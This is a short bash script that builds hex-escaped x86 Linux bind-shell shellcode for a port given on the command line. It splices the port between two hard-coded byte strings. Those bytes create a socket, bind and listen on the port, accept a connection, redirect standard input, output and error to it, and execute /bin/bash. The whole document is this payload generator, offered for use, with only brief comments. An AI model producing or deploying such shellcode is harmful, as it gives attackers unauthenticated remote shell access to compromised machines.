echo "usage : $0 <PORT_NUMBER>"
#Shellcode before the port
FIRST_SHELLCODE="\\x31\\xc9\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68"
#Shellcode after the port
LAST_SHELLCODE="\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\xf7\\xe2\\xb0\\x66\\xb3\\x02\\x89\\xe1\\xcd\\x80\\x52\\x57\\x89\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x52\\x52\\x57\\x89\\xe1\\xb3\\x05\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\xfe\\xc1\\xcd\\x80\\xb0\\x3f\\xfe\\xc1\\xcd\\x80\\x52\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x88\\xd1\\xb0\\x0b\\xcd\\x80"
#Convert input to hex, delimate with \x, escaped enough times..., and then make lowercase
PORT=`echo "obase=16;" $1|bc | sed 's/.\{2\}/\\\\\\x&/g'|tr '[:upper:]' '[:lower:]'`
SHELLCODE="$FIRST_SHELLCODE$PORT$LAST_SHELLCODE"
#^before the port + the port + after the port
echo $SHELLCODE
